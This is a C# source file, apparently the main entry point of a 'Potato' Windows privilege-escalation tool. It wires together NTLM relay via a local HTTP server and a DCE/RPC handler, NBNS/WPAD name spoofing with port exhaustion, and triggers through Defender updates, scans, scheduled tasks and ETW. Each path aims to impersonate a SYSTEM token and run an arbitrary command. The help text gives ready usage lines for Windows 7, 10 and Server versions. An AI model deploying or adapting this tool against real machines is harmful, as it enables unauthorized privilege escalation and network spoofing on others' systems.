using System;
using System.Collections.Generic;
using System.Threading;
using System.Net;
using System.Runtime.InteropServices;

// Remember to check the .NET version of the target, this is set to 3.5
// cd Potato\bin\x64\Release ; ilmerge /out:C:\Utils\pot_64.exe Potato.exe SharpCifs.dll NHttp.dll Microsoft.VisualStudio.OLE.Interop.dll

// cd ..\..\..\..\

// cd Potato\bin\Release\ ; ilmerge /out:C:\Utils\pot_32.exe Potato.exe SharpCifs.dll NHttp.dll Microsoft.VisualStudio.OLE.Interop.dll
namespace Potato
{
    //
    public class V
    {
        public static bool have_seimpersonate = false;
        //
        public static byte[] byte_slice(byte[] source, int start_pos, int end_pos)
        {
            if (end_pos == 0) { end_pos = source.Length; }
            int length = end_pos - start_pos;
            byte[] output = new byte[length];
            Array.Copy(source, start_pos, output, 0, length);
            return output;
        }
        //
        public static byte[] pointer_to_bytes(IntPtr pointer, int size = 0)
        {
            byte[] ret = new byte[size];
            Marshal.Copy(pointer, ret, 0, size);
            return ret;
        }
        //
        public static int sleep_time = 300000; // 5min_sleep is default
    }
    //
    public class Program
    {
        static Dictionary<string, string> parseArgs(string[] args)
        {
            Dictionary<string, string> ret = new Dictionary<string, string>();
            if (args.Length % 2 == 0 && args.Length > 0){
                for (int i=0;i<args.Length;i=i+2)
                {
                    ret.Add(args[i].Substring(1), args[i + 1]);
                }
            }
            return ret;
        }

        static void PrintHelp()
        {
            Console.WriteLine("Usage: potato.exe \n-ip <ip address> \n-cmd <command> \n-drop_first_dcom <true/false>");
            Console.WriteLine("-enable_exhaust <true/false> \n-enable_defender <true/false> \n-enable_spoof <true/false>");
            Console.WriteLine("-spoof_host <default wpad> \n-spoof_address <default, localip> \n-wpad_exclude <comma separated host to exclude>");
            Console.WriteLine("-schedule_task <true/false, Win10 only> \n-srv_port <port for webserver to listen, default 80>");
            Console.WriteLine("-enable_httpserver <true/false> \n-enable_defender_scan <true/false> \n-enable_etw <true/false> [guid][StandAlone]");
            Console.WriteLine("-enable_token <true/false> [needs http or dcom] \n-enable_dce <true/false> \n");
        }
        //
        static int Main(string[] args) 
        {
            Dictionary<string, string> argDict = parseArgs(args);
            String cmd = "\"C:\\Windows\\System32\\cmd.exe\" /K start";
            String ip = null, drop_first = null, enable_httpserver = null, spoof_address = null, 
                enable_dce = null, enable_exhaust = null, enable_spoof = null, enable_defender = null, 
                enable_defender_scan = null, schedule_task = null, spoof_host = "WPAD", enable_etw = null, enable_token = null;
            String wpad_exclude_str="live.sysinternals.com";
            int srvPort = 80;
            if (argDict.ContainsKey("ip")) ip = argDict["ip"];
            if (argDict.ContainsKey("cmd")) cmd = argDict["cmd"];
            if (argDict.ContainsKey("enable_exhaust")) enable_exhaust = argDict["enable_exhaust"];
            if (argDict.ContainsKey("enable_httpserver")) enable_httpserver = argDict["enable_httpserver"];
            if (argDict.ContainsKey("enable_defender")) enable_defender = argDict["enable_defender"];
            if (argDict.ContainsKey("enable_defender_scan")) enable_defender_scan = argDict["enable_defender_scan"];
            if (argDict.ContainsKey("enable_spoof")) enable_spoof = argDict["enable_spoof"];
            if (argDict.ContainsKey("enable_etw")) enable_etw = argDict["enable_etw"];
            if (argDict.ContainsKey("spoof_host")) spoof_host = argDict["spoof_host"];
            if (argDict.ContainsKey("wpad_exclude")) wpad_exclude_str = argDict["wpad_exclude"];
            if (argDict.ContainsKey("schedule_task")) schedule_task = argDict["schedule_task"];
            if (argDict.ContainsKey("srv_port")) srvPort = Int32.Parse(argDict["srv_port"]);
            if (argDict.ContainsKey("enable_dce")) enable_dce = argDict["enable_dce"];
            if (argDict.ContainsKey("spoof_address")) spoof_address = argDict["spoof_address"]; else spoof_address = "127.0.0.1";
            if (argDict.ContainsKey("drop_first_dcom")) drop_first = argDict["drop_first_dcom"];
            if (argDict.ContainsKey("enable_token")) enable_token = argDict["enable_token"];
            ;
            //
            if (args.Length > 0)
            {
                if (args[0].ToLower() == "-h" || args[0].ToLower() == "--h" || args[0].ToLower() == "-help" || args[0].ToLower() == "--help" || args[0].ToLower() == "/?")
                {
                    PrintHelp();
                    Console.WriteLine("\nExample Windows 7:\nPotato.exe -ip <ip> -cmd \"ping 127.0.0.1\" -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true");
                    Console.WriteLine("\nExample Windows 10:\nPotato.exe -ip <ip> -cmd \"ping 127.0.0.1\" -enable_httpserver true -schedule_task true");
                    Console.WriteLine("\nExample Windows Server 2008:\nPotato.exe -ip <ip> -cmd \"ping 127.0.0.1\" -enable_httpserver true -enable_spoof true -spoof_host \"WPAD.DOMAIN.TLD\" ");
                    Console.WriteLine("\nExample Windows Server 2012:\nPotato.exe -ip <ip> -cmd \"ping 127.0.0.1\" -enable_httpserver true -enable_spoof true");
                    Console.WriteLine("\nExample Windows 10:\nPotato.exe -ip <ip> -cmd \"ping 127.0.0.1\" -enable_httpserver true -enable_defender_scan true");
                    Console.WriteLine("\nExample Enable WebClient:\nPotato.exe -enable_etw true\nPotato.exe -enable_etw 22b6d684-fa63-4578-87c9-effcbe6643c7");
                    Console.WriteLine("\nExample IIS/MSSQL/*:\nPotato.exe -enable_token true -enable_dce true");
                    Console.WriteLine("Potato.exe -enable_token true -enable_httpserver true -enable_defender_scan true -srv_port 9595");
                    Console.WriteLine("Potato.exe");
                    Environment.Exit(0);
                }
            }
            else
            {
                enable_token = "true";
                enable_dce = "true";
            }
            //
            if (enable_token != null)
            {
                // Console.WriteLine("Enabiling your privs....");
                InvokePrivs.EnablePriv("SeImpersonatePrivilege");
            }
            //
            if (enable_etw != null)
            {
                EventTriggers.start_service(enable_etw);
            }
            //
            String[] wpad_exclude = wpad_exclude_str.Split(',');
            HTTPNtlmHandler httpServer = new HTTPNtlmHandler();
            Thread httpServerThread = null;
            if(enable_httpserver != null && enable_httpserver.Equals("true"))
            {
                httpServerThread = new Thread(() => httpServer.startListening(cmd, wpad_exclude, srvPort, enable_token));
                httpServerThread.Start();
            }
            //
            DCERPCNtlmHandler dcerpcServer = new DCERPCNtlmHandler();
            bool dropFirst = drop_first != null && drop_first.Equals("true");
            Thread bootstrapThread = null;
            Thread dcerpcThread = null;
            if(enable_dce != null && enable_dce.Equals("true"))
            {
                dcerpcThread = new Thread(() => dcerpcServer.start("127.0.0.1", "6666", "127.0.0.1", "135", cmd, dropFirst, enable_token));
                dcerpcThread.Start();
                Thread.Sleep(100);
                 try
                    {
                        bootstrapThread = new Thread(() => ComUtils.BootstrapComMarshal());
                        bootstrapThread.Start();
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine("This wasn't supposed to happen... {0}", e);
                    }
            }
            //
            Spoofer spoof = new NBNSSpoofer();
            bool enableExhaust = enable_exhaust != null && enable_exhaust.Equals("true");
            Thread spoofThread = new Thread(() => spoof.startSpoofing(ip, spoof_host, spoof_address, enableExhaust));
            if (enable_spoof != null && enable_spoof.Equals("true"))
            {
                if (ip == null || spoof_address == null) { 
                    Console.WriteLine("Need IP and spoof address for spoofing?"); 
                    Environment.Exit(0); 
                }
                spoofThread.Start();
                if (enableExhaust)
                {
                    while (NBNSSpoofer.doneUdp == false)
                    {
                        Thread.Sleep(2000);
                    }
                }
                spoof.checkSpoof(spoof_host,spoof_address);
                Console.WriteLine("Spoofed target " + spoof_host + " succesfully...");
            }
            //
            UpdateLauncher updateL = new UpdateLauncher();
            Thread updateLThread = new Thread(() => updateL.launchUpdateCheck());
            if (enable_defender != null && enable_defender.Equals("true"))
            {
                updateLThread.Start();
            }
            //
            Thread scanLThread = new Thread(() => updateL.scan_file(srvPort));
            if (enable_defender_scan != null && enable_defender_scan.Equals("true"))
            {
                scanLThread.Start();
            }
            //
            ScheduleTask sc = new ScheduleTask();
            Thread schTask = new Thread(() => sc.schtask(srvPort));
            if (schedule_task != null && schedule_task.Equals("true"))
            {
                schTask.Start();
            }
            //
            if (httpServerThread != null)
            {
                httpServer.finished.WaitOne();
                httpServerThread.Abort();
            }
            //
            if(dcerpcThread != null)
            {
                DCERPCNtlmHandler.finished.WaitOne();
                dcerpcThread.Abort();
                bootstrapThread.Abort();
            }
            //
            spoofThread.Abort();
            updateLThread.Abort();
            scanLThread.Abort();
            Thread.Sleep(500);
            Environment.Exit(0);
            return 0;
        }
    }
}
